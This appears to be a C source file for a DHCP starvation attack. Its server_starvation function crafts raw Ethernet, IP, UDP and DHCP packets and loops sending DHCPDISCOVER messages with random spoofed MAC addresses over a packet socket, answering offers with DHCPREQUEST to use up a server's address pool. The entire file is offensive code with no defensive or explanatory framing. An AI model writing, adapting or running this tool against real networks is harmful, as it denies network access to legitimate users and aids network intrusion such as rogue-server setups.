



#include "shared.h"


uint16_t checksum(void *buf, int len)
{
    uint16_t *ptr = buf;
    uint32_t sum  = 0;
    while(len > 1)
    {
        sum += *ptr++;
        len -= 2;
    }
    if(len == 1)
    {
        sum += *(uint8_t*)ptr;
    }
    while(sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ~sum;
}





uint8_t rand_value()
{
    int n = rand() % 255;
    return (uint8_t)n;
}


int8_t server_starvation(int *sockfd)
{
    

    size_t total_len = sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(dhcphdr);
    size_t udp_len   = sizeof(struct udphdr) + sizeof(dhcphdr);
    uint8_t dmac[6]  = ETH_DMAC;
    struct sockaddr_ll dest_addr = {0};
    socklen_t dest_addr_len = sizeof(dest_addr);
    static int p_id = 0;


    char ix_buffer[PKT_LEN];
    char ox_buffer[PKT_LEN];

    ethhdr *eth       = (ethhdr*)ix_buffer;
    struct iphdr *ip   = (struct iphdr*)(ix_buffer + ETH);
    struct udphdr *udp = (struct udphdr*)(ix_buffer + ETH + IP);
    dhcphdr *dhcp     = (dhcphdr*)(ix_buffer + ETH + IP + UDP);

    ethhdr *eth_req       = (ethhdr*)ox_buffer;
    struct iphdr *ip_req   = (struct iphdr*)(ox_buffer + ETH);
    struct udphdr *udp_req = (struct udphdr*)(ox_buffer + ETH + IP);
    dhcphdr *dhcp_req = (dhcphdr*)(ox_buffer + ETH + IP + UDP);


    // ETHERNET
    memcpy(eth->dst_mac,dmac,DMAC_LEN);
    eth->ether_type = htons(IPv4);


    // IP HEADER
    ip->version     = V4;
    ip->ihl         = IHDR_LEN;
    ip->tos         = IPTOS_LOWDELAY;
    ip->tot_len     = htons(total_len);
    ip->protocol    = IPPROTO_UDP;
    ip->id          = htons(p_id++);
    ip->frag_off    = FRAG_OFF;
    ip->ttl         = TIME_TO_LIVE;
    ip->check       = CHECK;
    ip->saddr       = inet_addr(SADDR_IP);
    ip->daddr       = inet_addr(DADDR_IP);
    ip->check       = checksum(ip,sizeof(struct iphdr));


    // UDP HEADER
    udp->source = htons(SPORT);
    udp->dest   = htons(DPORT);
    udp->len    = htons(udp_len);
    udp->check  = CHECK;


    // DHCP HEADER
    dhcp->op     = DHCP_OPCODE;
    dhcp->htype  = DHCP_HTYPE;
    dhcp->hlen   = DHCP_HLEN;
    dhcp->hops   = DHCP_HOP;
    dhcp->sec    = DHCP_SEC;
    dhcp->flags  = DHCP_BCAST;
    dhcp->ciaddr = 0;
    dhcp->yiaddr = 0;
    dhcp->siaddr = 0;
    dhcp->giaddr = 0;
    memset(dhcp->chaddr,0,CLIENT_HARDWARE_ADDR);
    memset(dhcp->files,0,DHCP_FILE_LEN);

    dhcp->mcookie[0] = DCOOKIE_0;
    dhcp->mcookie[1] = DCOOKIE_1;
    dhcp->mcookie[2] = DCOOKIE_2;
    dhcp->mcookie[3] = DCOOKIE_3;

    dhcp->options[0] = DHCP_MSG;
    dhcp->options[1] = OPTION_LEN;
    dhcp->options[2] = DHCPDISCOVER;
    dhcp->options[3] = DHCP_END;


    //copy memory of ix_buffer to ox_buffer
    memcpy(ox_buffer,ix_buffer,sizeof(ix_buffer));

    for(;;)
    {

        // sendto() and recvfrom() in one
        memset(&dest_addr,0,sizeof(dest_addr));
        dest_addr.sll_ifindex = if_nametoindex(eth0);
        dest_addr.sll_family = AF_PACKET;
        dest_addr.sll_halen = 6;
        dest_addr.sll_protocol = htons(ETH_P_ALL);
        memset(dest_addr.sll_addr,0xff,6);


        // generate a random xid
        dhcp->xid = htonl(rand() % 100000);

        for( int i = 0; i < 6; i++ )
        {
            uint8_t mac_v = rand_value();
            eth->src_mac[i] = mac_v;
            dhcp->chaddr[i] = mac_v;
        }

        int send_discover = sendto(*sockfd, ix_buffer, sizeof(ix_buffer),0,(struct sockaddr*)&dest_addr,sizeof(dest_addr));
        if(send_discover == -1)
        {
            perror("DHCPDISCOVER sent failed.\n");
            return -1;
        }

        int recv_offer = recvfrom(*sockfd,ix_buffer,sizeof(ix_buffer),0,(struct sockaddr*)&dest_addr,&dest_addr_len);
        if(recv_offer == -1)
        {
            perror("DHCPOFFER recv failed.\n");
            return -1;
        }

        if(dhcp->options[0] == DHCP_MSG && dhcp->options[2] == DHCPOFFER)
        {
            printf("+-------------------------+\n");
            printf("DHCPDISCOVER successful.\n");
            printf("DHCPOFFER successful.\n");
            printf("+-------------------------+\n");

            dhcp_req->options[0] = DHCP_MSG;
            dhcp_req->options[1] = 1;
            dhcp_req->options[2] = DHCPREQUEST;
            dhcp_req->options[3] = DHCP_END;

            int send_req = sendto(*sockfd,ox_buffer,sizeof(ox_buffer),0,(struct sockaddr*)&dest_addr,sizeof(dest_addr));
            if(send_req == -1)
            {
                perror("DHCPREQUEST send failed.\n");
                return -1;
            }

            int recv_ack = recvfrom(*sockfd,ox_buffer,sizeof(ox_buffer),0,(struct sockaddr*)&dest_addr,&dest_addr_len);
            if(recv_ack == -1)
            {
                perror("DHCPACK recv failed.\n");
                return -1;
            }

            printf("+-------------------------+\n");
            printf("DHCPREQUEST successful.\n");
            printf("DHCPACK successful.\n");
            printf("+-------------------------+\n");

            return 0;
        } //condition
    }//loop
    return STARV_SUCCESS;

}//function






